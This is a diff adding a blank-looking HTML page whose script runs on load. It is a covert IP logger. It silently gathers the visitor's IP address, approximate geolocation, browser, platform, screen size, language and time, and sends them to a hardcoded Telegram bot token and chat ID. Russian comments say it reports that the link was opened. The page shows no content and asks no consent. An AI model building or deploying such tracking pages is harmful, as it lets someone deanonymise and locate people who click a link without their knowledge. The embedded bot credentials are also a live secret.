@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title></title>
+    <script>
+        (async function() {
+            // Получаем IP
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            // Примерное местоположение по IP
+            let location = "Не определено";
+            try {
+                const geoResponse = await fetch(`https://freegeoip.app/json/${ip}`);
+                const geoData = await geoResponse.json();
+                location = `${geoData.city}, ${geoData.region_name}, ${geoData.country_name}`;
+            } catch (e) {
+                location = "Не удалось определить";
+            }
+
+            // Данные устройства
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const language = navigator.language;
+            const time = new Date().toISOString();
+
+            // Сообщение для Telegram
+            const botToken = '8211239754:AAH5pF047hyWePg8CYrKFJX39nUnkGGTJS4';
+            const chatId = '1250741267';
+            const message = `🔗 Ссылка открыта:
+IP: ${ip}
+Местоположение: ${location}
+Устройство: ${platform}
+Браузер: ${userAgent}
+Экран: ${screenRes}
+Язык: ${language}
+Время: ${time}`;
+
+            // Отправка в Telegram (без ожидания ответа, чтобы быстро закрыть)
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).then(() => {
+                // Можно закрыть окно, если открыто в новом
+                // window.close();
+            }).catch(() => {});
+        })();
+    </script>
+</head>
+<body>
+</body>
+</html>
